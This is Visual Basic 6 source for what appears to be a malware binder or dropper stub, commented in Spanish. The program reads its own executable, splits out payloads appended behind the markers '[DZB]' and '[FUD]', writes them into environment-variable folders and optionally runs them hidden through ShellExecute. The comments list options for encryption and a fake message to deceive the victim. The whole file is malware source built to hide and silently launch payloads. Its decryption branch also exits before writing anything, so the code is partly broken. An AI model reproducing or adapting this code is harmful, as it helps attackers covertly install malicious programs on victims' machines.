Attribute VB_Name = "Module1"
Option Explicit
Dim mex As String
Private Const SPRTF As String = "[DZB]"
Private Const SPRTO As String = "[FUD]"
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

     'FILE = Split(OPTs,SPRTO)(0)
     'Extraccion = Split(OPTs,SPRTO)(1)
     'Nombre de Extraccion = Split(OPTs,SPRTO)(2)
     'Ejecutar = Split(OPTs,SPRTO)(3)
     'Encriptar = Split(OPTs,SPRTO)(4)
     'Modo de Ejecución = Split(OPTs,SPRTO)(5)
     'Mensaje Fake = Split(OPTs,SPRTO)(6)
Sub Main()
Dim file As String
Dim x As Long
Dim OPTs As String
Dim ds As New Class2
Dim datos As String
    mex = App.path & "\" & App.EXEName & ".exe"
    datos = Loadme(mex)
    For x = 1 To UBound(Split(datos, SPRTF))
        OPTs = Split(datos, SPRTF)(x)
        file = Split(OPTs, SPRTO)(0)
            If Split(OPTs, SPRTO)(4) = "Si" Then
                file = ds.DecryptString(file, "ACM1PT")
                Exit Sub
            End If
            Open Environ(Split(OPTs, SPRTO)(1)) & "\" & Split(OPTs, SPRTO)(2) For Binary As #1
                Put #1, , file
            Close #1
    If Split(OPTs, SPRTO)(3) = "Si" Then
        ShellExecute 0&, vbNullString, Environ(Split(OPTs, SPRTO)(1)) & "\" & Split(OPTs, SPRTO)(2), vbNullString, vbNullString, IIf(Split(OPTs, SPRTO)(5) = "Visible", 1, 0)
    End If
    Next x
    
End Sub

Public Function Loadme(path As String) As String
    Dim free As Long
    Dim Buffer As String
    free = FreeFile
    Open path For Binary As #free
        Buffer = Space(LOF(free))
        Get free, , Buffer
    Close free
    Loadme = Buffer
End Function

